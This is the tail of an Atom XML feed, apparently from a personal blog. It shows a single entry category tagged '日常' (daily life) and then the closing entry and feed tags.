                                <category scheme="https://xuoneyuan.github.io/tags/%E6%97%A5%E5%B8%B8/" term="日常" label="日常" />
                            
                        
                    
                
            
        </entry>
    
</feed>
